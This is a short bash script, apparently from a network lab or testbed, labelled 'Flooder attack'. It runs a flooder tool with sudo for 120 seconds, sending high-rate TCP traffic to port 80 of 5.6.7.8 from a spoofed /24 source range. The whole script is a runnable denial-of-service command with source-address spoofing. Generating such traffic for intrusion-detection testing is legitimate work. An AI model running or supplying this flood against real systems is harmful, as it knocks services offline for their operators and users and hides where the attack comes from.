#!/bin/bash

# Flooder attack
TIMEOUT=120
sudo timeout $TIMEOUT flooder --dst 5.6.7.8 --highrate 100 --proto 6 --dportmin 80 --dportmax 80 --src 1.1.2.5 --srcmask 255.255.255.0
